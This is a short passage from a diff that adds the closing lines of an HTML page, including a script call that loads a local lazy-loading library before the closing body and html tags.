+  </script>
+  <script>loadScript("/js/lib/lozad.min.js", addLazyload)</script>
+  
+  
+</body>
+
+</html>
